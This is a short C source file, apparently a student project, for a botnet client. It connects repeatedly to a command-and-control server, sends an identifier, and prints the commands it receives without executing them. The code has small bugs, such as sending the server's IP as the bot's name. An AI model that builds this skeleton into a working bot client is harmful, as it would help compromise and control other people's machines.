/*
John Carter
Client code for botnet
3/30/2021
*/

#include "bot.h"

bot_t botInfo;

int repeated_connect( const char * server, struct addrinfo * rp ) {
    int             sd;
    char            message[256];
    
    do {
        if ( errno = 0, (sd = socket( rp->ai_family, rp->ai_socktype, rp->ai_protocol )) == -1 ) {
            return -1;
        } else if ( errno = 0, connect( sd, rp->ai_addr, rp->ai_addrlen ) == -1 ) {
            close( sd );
            sleep( 3 );
            write( 1, message, sprintf( message, "\x1b[2;33mTrying to connect to server %s ...\x1b[0m\n", server ) );
        } else {
            return sd;
        }
    } while ( errno != 0 );
    return -1;
}

int main( int argc, char ** argv ) {
    int       sd;
    int       ignore;
    char      message[256];
    char      welcomeMessage[512];
    pthread_t commandInputThread;
    
    struct addrinfo      addrinfo;
    struct addrinfo *    result;
    struct addrinfo *    rp;
    struct hostent  *    h;
    
    addrinfo.ai_flags = 0;
    addrinfo.ai_family = AF_INET;
    addrinfo.ai_socktype = SOCK_STREAM;
    addrinfo.ai_protocol = 0;
    addrinfo.ai_addrlen = 0;
    addrinfo.ai_addr = NULL;
    addrinfo.ai_canonname = NULL;
    addrinfo.ai_next = NULL;

    if ( argc < 3 ) {
        fprintf( stderr, "\x1b[1;31mMust specify server host name and port number on command line\x1b[0m\n");
        exit( 1 );
    } else if ( sscanf( argv[2], "%d", &ignore ) == 0 ) {
        fprintf( stderr, "\x1b[1;31mMust specify port number as integer on command line\x1b[0m\n");
        exit( 1 );
    } else if ( getaddrinfo( argv[1], argv[2], &addrinfo, &result ) != 0 ) {
        fprintf( stderr, "\x1b[1;31mgetaddrinfo( %s ) reason is %s\x1b[0m\n", argv[1], strerror( errno ));
        exit( 1 );
    } else if ((h = gethostbyname(argv[1])) == NULL) {
        herror("gethostbyname");
        exit(1);
    } else {
        for ( rp = result ; rp != 0 ; rp = rp->ai_next ) {
            if ( (sd = repeated_connect( argv[1], rp )) == -1 ) {
                continue;
            } else {
                write( 1, message, sprintf( message,  "\x1b[1;32mSUCCESS: Connected to server %s\x1b[0m\n", argv[1] ) );
                break;
            }
        }
        freeaddrinfo( result );
        if (sd == -1) {
            write(1, message, sprintf(message, "\x1b[1;31mCould not connect to server %s reason %s\x1b[0m\n", argv[1], strerror(errno)));
            return 1;
        } else {
            botInfo.sd = sd;
            strcpy(botInfo.username, inet_ntoa(*((struct in_addr *)h->h_addr_list[0])));
            write(sd, botInfo.username, strlen(botInfo.username));
            sprintf(welcomeMessage, "\x1b[1;34mWelcome back, %s!\x1b[0m\n", botInfo.username);
            write(1, welcomeMessage, strlen(welcomeMessage));
            
            pthread_create(&commandInputThread, NULL, commandInput, &sd);
            pthread_join(commandInputThread, NULL);
            pthread_cancel(commandInputThread);
        }
    }
    return 0;
}

void *commandInput(void *vargp) {
    /*
    Receive commands from the C&C server to execute
    */
    int             sd = *((int *) vargp);
    char            buffer[512];
    int             len;

    while ((len = read(sd, buffer, sizeof(buffer) - 1)) > 0) {
        printf("%s\n", buffer);
    }

    printf("\x1b[1;31mConnection Terminated: killing bot %s\x1b[0m\n", botInfo.username);
    close(sd);

    return NULL;
}